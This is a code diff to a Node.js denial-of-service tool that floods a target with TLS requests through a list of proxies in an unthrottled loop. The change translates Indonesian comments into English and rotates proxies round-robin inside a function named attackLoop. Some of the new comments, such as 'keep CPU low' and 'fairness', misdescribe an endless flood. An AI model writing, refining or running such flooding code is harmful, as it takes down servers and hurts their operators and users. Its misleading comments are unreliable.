@@ -64,7 +64,7 @@ if (cluster.isMaster) {
                                     "Connection: keep-alive\r\n\r\n";
                     client.write(request);
                 }
-                setImmediate(flood); // Tidak ada delay, loop terus
+                setImmediate(flood); // No delay, light looping
             }
             flood();
         });
@@ -78,12 +78,15 @@ if (cluster.isMaster) {
         });
     }
 
+    let proxyIndex = 0;
     function attackLoop() {
-        proxies.forEach(proxy => {
-            sendTLSRequest(proxy); // Mengirim permintaan dengan setiap proxy tanpa delay
-        });
-        setImmediate(attackLoop); // Loop tanpa delay
+        // Flood each proxy in a round-robin manner for better resource distribution
+        const proxy = proxies[proxyIndex];
+        proxyIndex = (proxyIndex + 1) % proxies.length; // Rotate proxies for fairness
+        sendTLSRequest(proxy); // Send request using selected proxy
+
+        setImmediate(attackLoop); // Loop without delay to keep CPU low
     }
 
-    attackLoop(); // Jalankan serangan tanpa delay
+    attackLoop(); // Start the attack loop
 }
